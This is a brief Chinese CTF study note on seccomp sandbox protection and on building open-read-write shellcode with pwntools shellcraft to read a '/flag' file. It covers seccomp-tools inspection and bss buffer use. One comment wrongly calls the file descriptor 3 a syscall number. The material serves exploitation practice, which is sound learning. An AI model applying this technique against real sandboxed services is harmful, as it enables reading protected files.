## 保护原理
我们的沙盒保护，就是指在我们的原来的程序中，添加了一个沙盒函数。
![[Pasted image 20240123162639.png]]

再添加了这个函数后，我们如果还是使用我们原来的 `ret2shellcode` 的方法，我们的程序会直接坏死。

于是，我们的基本思路就是构造出我们的一个 orw，所谓的 orw，就是 $\text{open read write}$ 的缩写，通过我们对于一个文件的打开，读和写，我们就可以直接获得我们的文件

## 检查工具
```bash
seccomp-tools dump ./orw 
```
## 操作方法：
第一步：找到一个空间来存储我们读入的数据。这里，我们应该在我们的 bss 段中找我们的对应地址是多少。
```cpp
buf=0x4040D0
```

第二步，通过我们的工具构造我们的打开函数
```cpp
sc=shellcraft.open('/flag')
```

第三步：通过我们的工具构造我们的读文件函数
```python
sc+=shellcraft.read(3,buf,0x30);# 这里的3表示我们的系统调用号
```

第四步：通过我们的工具构造我们的写文件函数：
```python
sc+=shellcraft.write(1,buf,0x30)
```

或者，我们可以结合上面的几种方法构造一个最简单的方法：
```cpp
sc=shellcraft.cat('/flag')
```